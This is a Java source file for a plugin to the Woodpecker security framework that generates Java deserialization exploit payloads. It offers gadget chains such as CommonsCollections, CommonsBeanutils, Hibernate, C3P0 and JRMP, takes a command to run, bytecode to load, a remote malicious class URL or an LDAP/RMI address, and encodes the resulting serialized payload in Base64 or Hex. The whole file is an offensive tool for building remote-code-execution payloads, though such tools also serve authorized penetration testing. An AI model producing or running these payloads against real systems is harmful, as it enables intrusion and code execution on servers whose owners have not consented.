package me.gv7.woodpecker.plugin;


import me.gv7.woodpecker.plugin.annotation.AnnotationUtils;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.Description;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.Payload;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class DeserializationPayloadGenerate implements IHelperPlugin {
    public static IHelperPluginCallbacks callbacks;
    public static IPluginHelper pluginHelper;


    @Override
    public void HelperPluginMain(IHelperPluginCallbacks iHelperPluginCallbacks) {
        this.callbacks = iHelperPluginCallbacks;
        this.pluginHelper = iHelperPluginCallbacks.getPluginHelper();
        callbacks.setHelperPluginName("Deserialization Payload Generator");
        callbacks.setHelperPluginVersion("0.1");
        callbacks.setHelperPluginAutor("bcvgh");
        callbacks.setHelperPluginDescription("简易的反序列化链利用工具");
        List<IHelper> helperList = new ArrayList<IHelper>();
        helperList.add(new PayloadGenerate());
        callbacks.registerHelper(helperList);
    }
    public class PayloadGenerate implements IHelper {

        @Override
        public String getHelperTabCaption() {
            return "PayloadGenerate";
        }

        @Override
        public IArgsUsageBinder getHelperCutomArgs() {
            IArgsUsageBinder argsUsageBinder = pluginHelper.createArgsUsageBinder();
            List<IArg> args = new ArrayList<IArg>();
            IArg args1 = DeserializationPayloadGenerate.pluginHelper.createArg();
            List<String> gadgetList = new ArrayList<String>(){{
                add("URLDNS");
                add("CC2");
                add("CC3");
                add("CC4");
                add("CC5");
                add("CC6");
                add("CC7");
                add("CC8");
                add("CC9");
                add("CC11");
                add("CCK1");
                add("CCK2");
                add("CCK3");
                add("CCK4");
                add("CB1");
                add("CB1_183");
                add("Hibernate1");
                add("Hibernate2");
                add("Hibernate_fr");
                add("C3P0URLClassLoader");
                add("C3P0ELInject");
                add("URLDNS");
                add("JRMPListener");
                add("JRMPClient");
                add("Jackson_fr");
                add("CC3_tw");
            }};
//            gadgetList.add("URLDNS");
//            gadgetList.add("CC1");
//            gadgetList.add("CC2");
//            gadgetList.add("CC3");
//            gadgetList.add("CC6");
//            gadgetList.add("CB1");
            args1.setName("Gadget");
            args1.setDefaultValue("URLDNS");
            args1.setType(IArg.ARG_TYPE_ENUM);
            args1.setEnumValue(gadgetList);
            args1.setDescription("使用的利用链");
            args1.setRequired(true);
            IArg args2 = DeserializationPayloadGenerate.pluginHelper.createArg();
            List<String> typeList = new ArrayList<String>(){{
                add("exec");
                add("bcel");
                add("bytecode");
                add("other");
            }};
            args2.setName("Type");
            args2.setDefaultValue("other");
            args2.setType(IArg.ARG_TYPE_ENUM);
            args2.setEnumValue(typeList);
            args2.setDescription("利用类型，支持command,bytecode,bcel");
            args2.setRequired(true);
            IArg args4 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args4.setName("OutPath");
            args4.setDescription("payload输出路径");
            args4.setRequired(false);
            //norequired
            IArg args7 = DeserializationPayloadGenerate.pluginHelper.createArg();
            List<String> otherList = new ArrayList<String>(){{
                add("Gzip");
            }};
            args7.setName("Zip");
            args7.setType(IArg.ARG_TYPE_ENUM);
            args7.setEnumValue(otherList);
            args7.setDescription("压缩方式");
            args7.setRequired(false);
            IArg args3 = DeserializationPayloadGenerate.pluginHelper.createArg();
            List<String> encodeList = new ArrayList<String>(){{
                add("Base64");
                add("Hex");
            }};
            args3.setName("Encode");
            args3.setEnumValue(encodeList);
            args3.setType(IArg.ARG_TYPE_ENUM);
            args3.setDescription("编码方式");
            args3.setRequired(false);
            IArg args5 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args5.setName("Command");
//
            args5.setDescription("命令");
            args5.setRequired(false);
            IArg args6 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args6.setName("ResourcePath");
            args6.setDescription("需要加载的文件绝对路径");
            args6.setRequired(false);
            IArg args8 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args8.setName("DnsLog");
            args8.setDescription("dnslog地址");
            args8.setRequired(false);
            IArg args9 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args9.setName("UrlClassLocation");
            args9.setDescription("远程恶意类地址");
            args9.setType(IArg.ARG_TYPE_HTTP_URL);
            args9.setRequired(false);
            IArg args10 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args10.setName("Ip");
            args10.setDescription("ip地址");
            args10.setType(IArg.ARG_TYPE_IP);
            args10.setRequired(false);
            IArg args11 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args11.setName("Port");
            args11.setType(IArg.ARG_TYPE_PORT);
            args11.setDescription("ip端口");
            args11.setRequired(false);
            IArg args12 = DeserializationPayloadGenerate.pluginHelper.createArg();
            args12.setName("LDAP_or_RMI");
            args12.setDescription("LDAP或RMI地址");
            args12.setRequired(false);
            args.add(args1);
            args.add(args2);
            args.add(args3);
            args.add(args5);
            args.add(args4);
            args.add(args6);
            args.add(args7);
            args.add(args8);
            args.add(args9);
            args.add(args10);
            args.add(args11);
            args.add(args12);
            argsUsageBinder.setArgsList(args);
            return argsUsageBinder;
        }

        @Override
        public void doHelp(Map<String, Object> customArgs, IResultOutput iResultOutput) {
            try {
                String Gadget = (String) customArgs.get("Gadget");
                String Type = (String) customArgs.get("Type");
                String OutPath = (String) customArgs.get("OutPath");
                String Encode = ((String) customArgs.get("Encode"))==null ? null : (String) customArgs.get("Encode");
                String ResourcePath = ((String) customArgs.get("ResourcePath"))==null ? null : (String) customArgs.get("ResourcePath");
                String Command = ((String) customArgs.get("Command"))==null ? null : (String) customArgs.get("Command");
                String Zip = ((String) customArgs.get("Zip"))==null ? null : (String) customArgs.get("Zip");
                String DnsLog = ((String) customArgs.get("DnsLog"))==null ? null : (String) customArgs.get("DnsLog");
                String UrlClassLocation = ((String) customArgs.get("UrlClassLocation"))==null ? null : (String) customArgs.get("UrlClassLocation");
                String Ip = ((String) customArgs.get("Ip"))==null ? null : (String) customArgs.get("Ip");
                String Port = ((String) customArgs.get("Port"))==null ? null : (String) customArgs.get("Port");
                String LDAP_or_RMI = ((String) customArgs.get("LDAP_or_RMI"))==null ? null : (String) customArgs.get("LDAP_or_RMI");

                Input input = new Input(Gadget,Type,Command,Zip,Encode,ResourcePath,OutPath,DnsLog,UrlClassLocation,Ip,Port,LDAP_or_RMI);




                Payload payload = new Payload(input);
                if (payload.gadgetClass==null){
                    iResultOutput.errorPrintln("Gadget或Type有误！");
                    return;
                }


                String requireParameter = (String) AnnotationUtils.getAnnotationValue(payload.gadgetClass, RequireParameter.class,"value");
                Class inputClazz = Class.forName("me.gv7.woodpecker.plugin.core.pojo.Input");
                String[] parameters = requireParameter.split(",");
                for (String parameter:parameters){
                    Field field = inputClazz.getDeclaredField(parameter);
                    field.setAccessible(true);
                    String value = (String) field.get(input);
                    if (value==null){
                        iResultOutput.errorPrintln("请输入"+requireParameter+"参数！");
                        return;
                    }
                }


                if (input.getGadget().equals("URLDNS")){
                    if (!input.getDnsLog().contains("http")){
                        iResultOutput.errorPrintln("dnslog地址错误！请以http/https开头！");
                        return;
                    }
                }
                else if (input.getType().equals("bytecode") || input.getType().equals("bcel")) {
                    if (input.getBytecode()==null){
                        iResultOutput.errorPrintln("当前读取字节为空，请检查ResourcePath参数是否正确！");
                        return;
                    }
                }


                Object object = payload.GadgetPayloadGenerate(input);
                Object objectPayload = ObjectPayload.getSerialBytes(object);
                if (input.getResourcePath()!=null){
                    iResultOutput.rawPrintln("当前读取class文件路径为：" + input.getResourcePath());
                }
                if (input.getZip()!=null){
                    objectPayload = payload.PayloadGenerate(input.getZip(),"Zip" , (byte[]) objectPayload);
                }
                if (input.getEncode()!=null){
                    objectPayload = payload.PayloadGenerate(input.getEncode(),"Encode" , (byte[]) objectPayload);
                }
                if (input.getOutput()!=null){
                    payload.PayloadOutPut(input.getOutput(),objectPayload);
                }
                iResultOutput.infoPrintln("因为直接生成的payload为字节数组，直接复制粘贴会导致反序列化失败，最好使用OutPath参数将数据流输出到文件中。(payload经过编码则无此问题）");
                iResultOutput.successPrintln("当前利用链需要的依赖:"+ AnnotationUtils.getAnnotationValue(payload.gadgetClass,DependenciesVersion.class,"value"));
                iResultOutput.successPrintln("利用链描述:"+ AnnotationUtils.getAnnotationValue(payload.gadgetClass, Description.class,"value"));
                iResultOutput.successPrintln("生成的payload:");
                if (objectPayload instanceof String){
                    iResultOutput.rawPrintln("\n" +(String) objectPayload + "\n");
                }else {
                    iResultOutput.rawPrintln("\n" +new String((byte[]) objectPayload) + "\n");
                }
                if (input.getOutput()!=null){
                    iResultOutput.successPrintln("payload已写入"+input.getOutput());
                }

            }catch (Throwable t){
                iResultOutput.errorPrintln(DeserializationPayloadGenerate.pluginHelper.getThrowableInfo(t));
            }
        }
    }
}